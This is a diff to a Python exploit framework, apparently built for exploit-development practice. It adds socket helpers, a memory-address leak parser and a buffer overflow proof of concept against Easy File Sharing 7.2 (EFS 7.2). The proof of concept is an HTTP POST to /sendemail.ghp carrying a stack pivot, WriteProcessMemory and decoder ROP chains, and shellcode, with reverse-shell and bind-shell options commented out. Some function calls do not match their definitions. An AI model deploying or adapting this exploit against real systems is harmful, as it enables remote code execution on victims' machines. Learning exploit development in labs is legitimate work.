-                print("[!] Operation interrupted by user.")
+                if debug:
+                    print("[!] Operation interrupted by user.")
                 if sock:
                     sock.close()
                 sys.exit(0)
 
-        # Use or create global TCP socket; send and buffered receive
-        def sendsocktcp(buffer, sendall=False, keepopen=True):
+            except Exception as e:
+                if debug:
+                    print(f"[!] Error: {e}")
+                    traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+        # Use or create global TCP socket; send without receive
+        def sendsocktcp(buffer, sendall=False, keepopen=True, timeout=socktimeout, debug=False):
+            global sock
+            try:
+                # Ensure socket is open and valid
+                if not (sock and sock.fileno() != -1):
+                    if debug:
+                        print("[!] Socket not open, attempting to reopen...")
+                    Network.TCP.creategsocktcp(host, port)
+                else:
+                    if debug:
+                        print("[*] Using existing socket.")
+
+                # Apply timeout
+                sock.settimeout(timeout)
+
+                # Send data
+                if sendall:
+                    sock.sendall(buffer)
+                    if debug:
+                        print(f"[✓] Sent {len(buffer)} / {hex(len(buffer))} bytes using sendall().")
+                else:
+                    sent = sock.send(buffer)
+                    if debug:
+                        print(f"[✓] Sent {sent} / {hex(sent)} bytes using send().")
+
+                # Optionally close socket
+                if not keepopen:
+                    if debug:
+                        print("[*] Closing socket as requested.")
+                    sock.close()
+
+            except socket.timeout:
+                if debug:
+                    print(f"[!] Socket send timed out after {timeout} seconds.")
+                if not keepopen:
+                    sock.close()
+                sys.exit(0)
+
+            except KeyboardInterrupt:
+                if debug:
+                    print("[!] Operation interrupted by user.")
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+            except Exception as e:
+                if debug:
+                    print(f"[!] Error during socket send: {e}")
+                    traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+        # Use or create global TCP socket; receive only
+        def recvsocktcp(recvsize=1024, keepopen=True, buffered=False, timeout=socktimeout, debug=False):
             global sock
             try:
                 # Check if the socket is open, otherwise create a new one
                 if not (sock and sock.fileno() != -1):
-                    print("[!] Socket not open, reopening...")
+                    if debug:
+                        print("[!] Socket not open, reopening...")
                     Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
-                # Send data
-                if sendall:
-                    sock.sendall(buffer)
+
+                sock.settimeout(timeout)
+
+                if buffered:
+                    resp = b""
+                    total_received = 0
+                    chunk_num = 1
+                    while True:
+                        try:
+                            chunk = sock.recv(recvsize)
+                            if not chunk:
+                                if debug:
+                                    print(f"[!] No more data received. Total: {total_received} bytes.")
+                                break
+                            resp += chunk
+                            chunk_len = len(chunk)
+                            total_received += chunk_len
+                            if debug:
+                                print(f"[Chunk {chunk_num}] Received {chunk_len} bytes (Total: {total_received})")
+                            chunk_num += 1
+                        except socket.timeout:
+                            if debug:
+                                print(f"[!] Socket timeout. Final total received: {total_received} bytes.")
+                            break
                 else:
-                    sock.send(buffer)
+                    resp = sock.recv(recvsize)
+                    if debug:
+                        print(f"[Unbuffered] Received {len(resp)} bytes")
+
                 if not keepopen:
                     sock.close()
+
+                return resp
+
             except socket.timeout:
-                print("[!] Socket timeout.")
+                if debug:
+                    print("[!] Socket timeout.")
                 if not keepopen:
                     sock.close()
                 sys.exit(0)
             except Exception as e:
-                print(f"[!] Error: {e}")
-                traceback.print_exc()
+                if debug:
+                    print(f"[!] Error: {e}")
+                    traceback.print_exc()
                 if sock:
                     sock.close()
                 sys.exit(0)
             except KeyboardInterrupt:
-                print("[!] Operation interrupted by user.")
+                if debug:
+                    print("[!] Operation interrupted by user.")
+                if sock:
+                    sock.close()
+                sys.exit(0)
+        
+        def recvsocktcp_readline(keepopen=True, timeout=socktimeout, debug=False):
+            global sock
+            try:
+                # Check if the socket is open, otherwise create a new one
+                if not (sock and sock.fileno() != -1):
+                    if debug:
+                        print("[!] Socket not open, reopening...")
+                    Network.TCP.creategsocktcp(host, port)
+
+                if timeout:
+                    sock.settimeout(timeout)
+
+                if debug:
+                    print("[*] Waiting to read a line from the socket...")
+
+                # Using makefile() for readline, which handles line buffering
+                with sock.makefile('r') as sfile:
+                    line = sfile.readline()
+
+                if not line:
+                    if debug:
+                        print("[!] No data received from readline().")
+                    if not keepopen:
+                        sock.close()
+                    return None
+
+                line_stripped = line.strip()
+                if debug:
+                    print(f"[✓] Received line: {line_stripped}")
+
+                if not keepopen:
+                    sock.close()
+
+                return line_stripped
+
+            except socket.timeout:
+                if debug:
+                    print("[!] Socket timeout while reading line.")
+                if not keepopen:
+                    sock.close()
+                sys.exit(0)
+
+            except Exception as e:
+                if debug:
+                    print(f"[!] Error while reading line: {e}")
+                    traceback.print_exc()
+                if sock:
+                    sock.close()
+                sys.exit(0)
+
+            except KeyboardInterrupt:
+                if debug:
+                    print("[!] Operation interrupted by user.")
                 if sock:
                     sock.close()
                 sys.exit(0)
                 
-        # Use or create global TCP socket; receive only
-        def recvsocktcp(recvsize=1024, keepopen=True):
-            global sock
-            try:
-                # Check if the socket is open, otherwise create a new one
-                if not (sock and sock.fileno() != -1):
-                    print("[!] Socket not open, reopening...")
-                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
-                # Send data
-                resp = sock.recv(recvsize)
-                if not keepopen:
-                    sock.close()
-                return resp
-            except socket.timeout:
-                print("[!] Socket timeout.")
-                if not keepopen:
-                    sock.close()
-                sys.exit(0)
-            except Exception as e:
-                print(f"[!] Error: {e}")
-                traceback.print_exc()
-                if sock:
-                    sock.close()
-                sys.exit(0)
-            except KeyboardInterrupt:
-                print("[!] Operation interrupted by user.")
-                if sock:
-                    sock.close()
-                sys.exit(0)
-
-        def recvsocktcp_readline(keepopen=True, timeout=None):
-            global sock
-            try:
-                # Check if the socket is open, otherwise create a new one
-                if not (sock and sock.fileno() != -1):
-                    print("[!] Socket not open, reopening...")
-                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
-                if timeout:
-                    sock.settimeout(timeout)  # Set socket timeout if provided
-                # Read data line by line from the socket
-                data = sock.makefile('r'). readline()  # Using makefile() to handle readline
-                if not data:
-                    print("[!] No data received.")
-                    if not keepopen:
-                        sock.close()
-                    return None
-                # If the connection is to be closed after reading one line
-                if not keepopen:
-                    sock.close()
-                return data.strip()  # Strip newline and return the line
-
-            except socket.timeout:
-                print("[!] Socket timeout.")
-                if not keepopen:
-                    sock.close()
-                sys.exit(0)
-
-            except Exception as e:
-                print(f"[!] Error: {e}")
-                traceback.print_exc()
-                if sock:
-                    sock.close()
-                sys.exit(0)
-
-            except KeyboardInterrupt:
-                print("[!] Operation interrupted by user.")
-                if sock:
-                    sock.close()
-                sys.exit(0)
-                        
         # Regular sendrecv TCP socket
-        def sendrecvtcp(host,port,buffer,recv=True,recvsize=1024):
+        def sendrecvtcp(host, port, buffer, recv=True, recvsize=1024, buffered=False, timeout=timeout, debug=False):
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((host, int(port)))
-                s.send(buffer)
-                if recv:
-                    response = s.recv(recvsize)
-                    s.close()
-                    return response
-                else:
-                    s.close()
-                    return False
-            except Exception:
-                traceback.print_exc()
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(timeout)
+                    if debug:
+                        print(f"[*] Connecting to {host}:{port}...")
+                    s.connect((host, int(port)))
+                    if debug:
+                        print(f"[✓] Connected. Sending data...")
+                    s.sendall(buffer)
+
+                    if recv:
+                        if buffered:
+                            response = b""
+                            total_received = 0
+                            chunk_num = 1
+                            while True:
+                                try:
+                                    chunk = s.recv(recvsize)
+                                    if not chunk:
+                                        if debug:
+                                            print(f"[!] No more data received. Total: {total_received} bytes.")
+                                        break
+                                    response += chunk
+                                    chunk_len = len(chunk)
+                                    total_received += chunk_len
+                                    if debug:
+                                        print(f"[Chunk {chunk_num}] Received {chunk_len} bytes (Total: {total_received})")
+                                    chunk_num += 1
+                                except socket.timeout:
+                                    if debug:
+                                        print(f"[!] Timeout reached. Final total received: {total_received} bytes.")
+                                    break
+                            return response
+                        else:
+                            response = s.recv(recvsize)
+                            if debug:
+                                print(f"[✓] Received {len(response)} bytes.")
+                            return response
+                    else:
+                        if debug:
+                            print("[*] Send-only mode, no response expected.")
+                        return False
+
+            except socket.timeout:
+                if debug:
+                    print("[!] Socket operation timed out.")
                 sys.exit(0)
             except KeyboardInterrupt:
-                Helpers.keyboard_interrupt() 
+                if debug:
+                    print("[!] Operation interrupted by user.")
+                Helpers.keyboard_interrupt()
+            except Exception as e:
+                if debug:
+                    print(f"[!] Error during send/receive operation: {e}")
+                    traceback.print_exc()
+                sys.exit(0)     
 
         # Only sending TCP socket, no receiving
-        def sendtcp(host,port,buffer):
+        def sendtcp(host,port,buffer, debug=False):
             try:
-                print("Sending buffer...")
+                if debug:
+                    print("Sending buffer...")
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((host, int(port)))
                 s.send(buffer)
@@ -1358,8 +1690,7 @@ class Network:
                 Helpers.keyboard_interrupt() 
 
         # Flush a given or global TCP socket
-        def flushsocktcp(timeout=timeout,chunk_size=1024,retries=5):
-            global sock
+        def flushsocktcp(timeout=timeout, chunk_size=1024, socket=False, retries=5, debug=False):
             # Check if the socket is valid and initialized
             if not isinstance(sock, socket.socket):
                 raise ValueError("No socket to flush.")
@@ -1369,17 +1700,18 @@ class Network:
                 while attempts < retries:
                     # Try to read data from the socket
                     data = sock.recv(chunk_size)
-                    print(data)
                     if not data:
                         break  # No more data, buffer is flushed
                     # Optionally handle or discard data
                     attempts += 1
-                if attempts == retries:
+                if attempts == retries and debug:
                     print(f"[!] Maximum read attempts ({retries}) reached without completing buffer flush.")
             except socket.timeout:
-                print("Socket timeout reached while flushing buffer.")
+                if debug:
+                    print("Socket timeout reached while flushing buffer.")
             except socket.error as e:
-                print(f"Error while flushing buffer: {e}")
+                if debug:
+                    print(f"Error while flushing buffer: {e}")
 
     class UDP:
         def createsockudp(host,port):
@@ -1387,7 +1719,7 @@ class Network:
             sockudp.connect((host, port))
             return sockudp
 
-        def sendrecvudp(host,port,buffer,recvsize=1024,verbose=False):
+        def sendrecvudp(host, port, buffer, recvsize=1024, debug=False):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.settimeout(timeout)
@@ -1398,17 +1730,21 @@ class Network:
                     s.close()
                     end = time.time()
                     elapsed = end - start
-                    if verbose:
+                    if debug:
                         print("[*] Time elapsed sending UDP packet: " + str(elapsed))
                     return resp
                 except socket.timeout:
-                    print("[!] Connection timed out")
-                    exit(0)
+                    if debug:
+                        print("[!] Connection timed out")
+                    sys.exit(0)
             except Exception:
-                traceback.print_exc()
+                if debug:
+                    traceback.print_exc()
                 sys.exit(0)
             except KeyboardInterrupt:
-                Helpers.keyboard_interrupt() 
+                if debug:
+                    print("[!] Operation interrupted by user.")
+                Helpers.keyboard_interrupt()
 
 class Payload:
     def fuzz():
@@ -1422,20 +1758,8 @@ class Payload:
         buffer += b"A" * maxlen
 
         return buffer
-        
-    def leakaddr():
-        # Lengths
-        maxlen = 0x15000
-        
-        # Building buffer
-        buffer = b""
-        buffer += b"F" * (maxlen - len(buffer))
 
-        lenpacket = pack(">i", len(buffer) - 4)
-
-        return lenpacket + buffer
-
-    def poccrash():
+    def poc_leak():
         
         # Lengths
         maxlen = 0x4000
@@ -1444,9 +1768,81 @@ class Payload:
         buffer = b""
         buffer += b"E" * (maxlen - len(buffer))
 
+        return buffer        
+
+    ### EXAMPLE POC BASED ON EFS 7.2
+    def poc_crash(ropskelfunc,ropchainfunc,ropchainscdecoder,ropskelalign,selectedsc):
+        # Lengths
+        maxlen = 0x1000
+        lenropblock = 0x300
+        
+        # Offsets
+        offsetropskel = 0x10
+        offsetlanding = 0x7bf
+        offsetret = 0xfe8
+        
+        # Values
+        stackpivot = pack("<I", 0x10022877)            # add esp, 0x00001004 ; ret ;
+        nopsled = b"\x90" * 0x10
+        
+        # POC buffer
+        pocbuf = b""
+        pocbuf += b"A" * offsetropskel                  # Static length
+        pocbuf += ropskelfunc                            # Static length
+        pocbuf += b"B" * (offsetlanding - len(pocbuf))  # Static length
+        pocbuf += ropchainfunc                           # Landing second stackpivot; static length
+        pocbuf += ropchainscdecoder                     # Dynamic length
+        pocbuf += ropskelalign                          # Static length
+        pocbuf += b"C" * (lenropblock - len(ropchainfunc+ropchainscdecoder+ropskelalign))    # Dynamic length
+        pocbuf += nopsled                               # Static length
+        pocbuf += selectedsc                            # Dynamic length
+        pocbuf += b"D" * (offsetret - len(pocbuf))      # Static length
+        pocbuf += stackpivot                            # First stackpivot; static length
+        
+        # Building buffer
+        buffer = b"POST /sendemail.ghp HTTP/1.1\r\n\r\n"
+        buffer += b"Host: " + host.encode()
+        buffer += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
+        buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        buffer += b"Accept-Language: en-US,en;q=0.5"
+        buffer += b"Accept-Encoding: gzip, deflate"
+        buffer += b"Connection: close"
+        buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += b"Email=%s&getPassword=1234" % pocbuf
+        
         return buffer
    
 class Program:
+    def parseResponse(response):
+        """
+        DESCR: Parse a server response and extract the leaked address
+        IN: Raw response text in string
+        OUT: Extracted hex address
+        """
+        pattern = b"Address is:"
+        address = None
+        for line in response.split(b"\n"):
+            if line.find(pattern) != -1:
+                address = int((line.split(pattern)[-1].strip()),16)
+        if not address:
+            print("[-] Could not find the address in the response")
+            sys.exit()
+        return address
+        
+    def leakmodbaseAddr(module,symbol,offset):
+        # Create payload
+        paylleak = Payload.poc_leak(symbol)
+        # Send EIP/CRASH
+        leak = Network.TCP.sendrecvsocktcp(paylleak,1024,1024,False,False,False)
+        addr = Program.parseResponse(leak)
+        if addr:
+            modbase = addr - offset
+            print("[+] Address of " + module + "!" + symbol.decode() + " is " + hex(addr))
+            print("[+] Baseaddress for module " + module + " is " + str(hex(modbase)))            
+            return modbase
+        else:
+            return False       
+    
     def sendFunction(opcode):
         # ADD PROGRAM SPECIFIC CODE HERE
         return
@@ -1469,7 +1865,6 @@ def main(argv):
     # Globals
     global host, port
     global timeout
-    global sock
 
     # Vars
     host = args.host
@@ -1478,20 +1873,14 @@ def main(argv):
     revport = args.revport
 
     ### ADD VARS HERE ###
-    intmainbaseaddr = 0x0
-    intwpmaddr = 0x0
-    intbaselib = 0x0
     lenbadscchars = 0x0  
-    lenropdecoder = 0x0
-    lenbadscchars = 0x0
     
     ###############
     ### OFFSETS ###
     ###############
     # Offset to main library
     offsetk32wpm = 0x43b10
-    offsetlibfunction = 0x13230
-    offsetwinmain = 0x66BC56
+    offsetlib_libdll = 0x123
     
     # Libeay specific offsets
     offsetscretaddr = 0x92c0e # Originally 0x92c00, but contains bad char
@@ -1503,8 +1892,11 @@ def main(argv):
     
     # ROP offset var initialize
     payloadoffsetsc = 0x0    
-    ropskeloffsetlpbuf = 0x0
+    # Offset WriteProcessMemory, VirtualAlloc, etc.    
+    ropskeloffsetfunc = 0x0
+    # Offset to ROP decoder
     ropdecoderoffseteax = 0x0
+    # Align with ROP skeleton
     ropskelalign = 0x0
 
     ###################################
@@ -1514,69 +1906,84 @@ def main(argv):
     # Shellcode selection
     # selectedsc = Shellcode.asmrevshellShellcode(revhost,revport)
     # selectedsc = Shellcode.asmbindshellcode(revport)
-    selectedsc = Shellcode.msflocalmsgShellcode()
+    # selectedsc = Shellcode.msflocalmsgShellcode()
+    selectedsc = Shellcode.asmcalcShellcode()
     # Map badchars and convert shellcode
     encodedsc = Helpers.mapandconvertShellcode(selectedsc,offsetEncoding)
 
     # Variable and ROP parameter lengths    
-    print(Colors.BOLD + "[*] BUFFER VARS\n" + Colors.END)
+    print(Colors.BOLD + "[*] LENGTH BUFFER VARS" + Colors.END)
     lenbadscchars = len(Shellcode.mappedbadscchars)
-    lenropchainwpm = len(ROP.chainWriteProcessMemory(intbaselib,ropskeloffsetlpbuf,payloadoffsetsc,ropdecoderoffseteax)*4)
-    lenropscdecoder = len(ROP.chainscDecoder(intbaselib,encodedsc,offsetDecoding)*4)
-    lenropskelalign = len(ROP.chainropskelAlign(intbaselib,ropskelalign)*4)
+    lenropskeleton = len(ROP.wpmSkeleton(offsetscretaddr,offsetwritable)*4)
+    lenropchainfunc = len(ROP.chainWriteProcessMemory(ropskeloffsetfunc,payloadoffsetsc,ropdecoderoffseteax)*4)
+    lenropscdecoder = len(ROP.chainscDecoder(encodedsc,offsetDecoding)*4)
+    lenropskelalign = len(ROP.chainropskelAlign(ropskelalign)*4)
     # Define a fixed width for alignment
-    width = 4
-    print(f"[*] Length shellcode                {len(selectedsc):<{width}} / {hex(len(selectedsc))}")
-    print(f"[*] Length badchars shellcode       {lenbadscchars:<{width}} / {hex(lenbadscchars)}")
-    print(f"[*] Length ROP chain WPM:           {lenropchainwpm:<{width}} / {hex(lenropchainwpm)}")
-    print(f"[*] Length ROP shellcode decoder:   {lenropscdecoder:<{width}} / {hex(lenropscdecoder)}")
-    print(f"[*] Length ROP skeleton align:      {lenropskelalign:<{width}} / {hex(lenropskelalign)}")
+    label_width = 30
+    decimal_width = 6
+    print(f"{'[*] Shellcode used':<{label_width}} {len(selectedsc):>{decimal_width}} / {hex(len(selectedsc))}")
+    print(f"{'[*] Shellcode badchars':<{label_width}} {lenbadscchars:>{decimal_width}} / {hex(lenbadscchars)}")
+    print(f"{'[*] ROP skeleton':<{label_width}} {lenropskeleton:>{decimal_width}} / {hex(lenropskeleton)}")
+    print(f"{'[*] ROP chain':<{label_width}} {lenropchainfunc:>{decimal_width}} / {hex(lenropchainfunc)}")
+    print(f"{'[*] ROP shellcode decoder':<{label_width}} {lenropscdecoder:>{decimal_width}} / {hex(lenropscdecoder)}")
+    print(f"{'[*] ROP skeleton align':<{label_width}} {lenropskelalign:>{decimal_width}} / {hex(lenropskelalign)}")
 
     try:
         ######################       
         ### LEAK ADDRESSES ###
         ######################
         print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
-        #intwpmaddr = Program.leakmodAddr("Kernel32",b"WriteProcessMemory")
-        #intbaselib = Program.leakmodAddr("Libmoduledll",b"FUNCTION",offsetlibfunction)
+        leaked = []
+                
+        # Create socket
+        Network.TCP.creategsocktcp(host,port)        
+        
+        # Kernel32
+        module = "Kernel32"
+        symbol = b"WriteProcessMemory"
+        intk32addr = Program.leakmodbaseAddr(module,symbol,offsetk32wpm)
+        intwpmaddr = intk32addr + offsetk32wpm
+        leaked.append(intwpmaddr)
+        # libdll; example module and symbol
+        module = "libdll"
+        symbol = b"SomeSymbol"
+        intbaselib_libdll = Program.leakmodbaseAddr(module,symbol,offsetlib_libdll)
+        leaked.append(intbaselib_libdll)
+
+        # Check base address for bad chars
+        for addr in leaked:
+            if Helpers.containsBadchars(addr,'upper'):
+                print("\n[!] Bad character in address " + hex(addr))
+                exit(-1)        
         
         ###########
         ### ROP ###
         ###########
-        # Example ASCII representation of ROP vars in payload
-        # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-        #          [Filler and header]      [ROP skeleton]         [Filler]             [Stackpivot]           [ROP chain]       [ROP shellcode decoder]      [ROP align EAX decoder]        [Filler]         [Encoded shellcode]     [Filler]
-        # OFFSET:       (0x0)        <-->      (0xEC)       <-->                  <-->    (0x140)     <-->       (0x144)     <-->        (0x1E0)         <-->                        <-->                  <-->   (0x1004)    <-->  (Until 0x4000)                                                                                
-        # SIZE:         (0x0)        <-->       (0x10)      <-->                  <-->     (0x4)      <-->       (0x9c)      <-->       (DYNAMIC)        <-->         (0x10)         <-->    (DYNAMIC)     <-->   (DYNAMIC)   <-->   (Dynamic)
-        # VALUE:  <FILLER + HEADER>  <-->     <ROPSKELWPM>  <-->  <FILLER CHARS>  <-->  <STACKPIVOT>  <-->    <ROPCHAINWPM>  <-->  <ROPCHAINSCDECODER>   <-->  <ROPCHAINSKELALIGN>   <-->  <FILLER CHARS>  <-->  <SHELLCODE>  <-->  <FILLER CHARS>
-        # TYPE:        <static>      <-->      <static>     <-->   <static>       <-->    <static>    <-->       <static>    <-->       <DYNAMIC>        <-->        <static>        <-->    <DYNAMIC>     <-->   <DYNAMIC>   <-->   <DYNAMIC>
-        # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-        # VARS:                               <intwpmaddr>                              <stackpivot>          <intbaselib>             <intbaselib>                 <intbaselib>                                 <encodedsc>
-        #                                   <offsetscretaddr>                                                <payloadoffsetsc>         <encodedsc>                 <ropskelalign>
-        #                                   <offsetwritable>                                               <ropskeloffsetlpbuf>      <offsetDecoding>
-        #                                                                                                  <ropdecoderoffseteax>
-        #                                                                                                                                         
-
         # Update ROP offset vars based on leaked addresses
-        payloadoffsetsc = 0xeb8                                                         # Offset to first character of shellcode
-        ropskeloffsetlpbuf = -(payloadoffsetsc + 0x50)                                  # Offset to first value in ROP skeleton to replace
-        ropdecoderoffseteax = -(payloadoffsetsc + 0x4b)                                 # Offset to first char of shellcode, minus one; Fastback specific
-        ropskelalign = -(payloadoffsetsc + Shellcode.mappedbadscchars[-1] + 0x5f)       # Offset to ropskel function, calculated on last shellcode badbyte occurence
+        ropskeloffsetfunc = 0x1438                                                                  # K32 offset; first value in ROP skeleton to replace
+        payloadoffsetsc = -0xa9f                                                                    # Offset to first character of shellcode
+        ropdecoderoffseteax = payloadoffsetsc - 0xc                                                 # Offset to first char of shellcode, minus one (ROP decoder specific)
 
+        # Calculate alignment after decoding shellcode; after decoding, EAX is located at last decoded shellcode badchar
+        # Offsets and lengths based on current example payload
+        offsetropskel = 0x7bf                                                                       # Offset until begin ROP chains
+        lenropblock = 0x300                                                                         # As used in payload; Dynamic ROP chains filled until 0x300 of static length
+        ropskelalign = (offsetropskel + lenropblock + Shellcode.mappedbadscchars[-1])               # Offset to ropskel function, calculated on last shellcode badbyte occurence
+        
         # Update ROP chains
-        ropskelwpm_gadgets = ROP.wpmSkeleton(intwpmaddr,intbaselib,offsetscretaddr,offsetwritable)
-        ropskelwpm = b''.join(pack('<L',_) for _ in ropskelwpm_gadgets)
-        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intbaselib,payloadoffsetsc,ropskeloffsetlpbuf,ropdecoderoffseteax)
+        ropskelfunc_gadgets = ROP.wpmSkeleton(offsetscretaddr,offsetwritable)
+        ropskelfunc = b''.join(pack('<L',_) for _ in ropskelfunc_gadgets)
+        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intbaselib_libdll,payloadoffsetsc,ropdecoderoffseteax)
         ropchainwpm = b''.join(pack('<L',_) for _ in ropchainwpm_gadgets)
-        ropchainscdecoder_gadgets = ROP.chainscDecoder(intbaselib,encodedsc,offsetDecoding)
+        ropchainscdecoder_gadgets = ROP.chainscDecoder(intbaselib_libdll,encodedsc,offsetDecoding)
         ropchainscdecoder = b''.join(pack('<L',_) for _ in ropchainscdecoder_gadgets)
-        ropchainskelalign_gadgets = ROP.chainropskelAlign(intbaselib,ropskelalign)
+        ropchainskelalign_gadgets = ROP.chainropskelAlign(intbaselib_libdll,ropskelalign)
         ropchainskelalign = b''.join(pack('<L',_) for _ in ropchainskelalign_gadgets)
 
         ### ROP CHECK FOR BADCHARS ###
         # Add all gadgets to chain to check for badchars
         check_badchar_ropchains = [
-            ropskelwpm_gadgets,
+            ropskelfunc_gadgets,
             ropchainwpm_gadgets,
             ropchainscdecoder_gadgets,
             ropchainskelalign_gadgets,
@@ -1590,11 +1997,10 @@ def main(argv):
         print(Colors.BOLD + "\n[*] CHECKING ROP CHAINS..." + Colors.END)
         for chain in check_badchar_ropchains:
             chainname = [key for key, value in locals().items() if value == chain]
-            print(Colors.BOLD + "[*] " + chainname[0] + Colors.END)
+            print("[*] " + chainname[0])
             for rop in chain:
-                hexRop = Helpers.toByteHex(hex(rop))
-                if Helpers.containsBadchars(hexRop):
-                    print("[!] Bad character in ROP chain")
+                if Helpers.containsBadchars(rop):
+                    print("[!] Bad character in ROP " + hex(rop))
                     exit(-1)
                               
         ###########################################                       
@@ -1604,7 +2010,7 @@ def main(argv):
         # Create socket
         sock = Network.TCP.creategsocktcp(host,port)
         # Send data
-        paylCrash = Payload.poccrash(intbaselib,ropskelwpm,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
+        paylCrash = Payload.poc_crash(intbaselib_libdll,ropskelfunc,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
         # Send EIP/CRASH
         Network.TCP.sendrecvsocktcp(paylCrash)
         # Close socket
